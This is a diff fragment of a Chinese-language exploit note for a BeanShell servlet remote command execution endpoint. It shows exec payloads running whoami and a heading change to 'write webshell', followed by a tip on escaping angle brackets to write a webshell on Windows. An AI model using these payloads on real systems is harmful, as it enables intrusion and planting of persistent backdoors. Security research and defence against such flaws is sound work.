@@ -7,7 +7,7 @@ URL+/servlet/~ic/bsh.servlet.BshServlet
   exec("cmd /c whoami.exe")
   exec("/bin/sh whoami")
 
-0x02 写shell
+0x02 写webshell
 
    通常Windows系统将webshell <>变成^<和^>然后进行写入，例如某蝎的
    ```
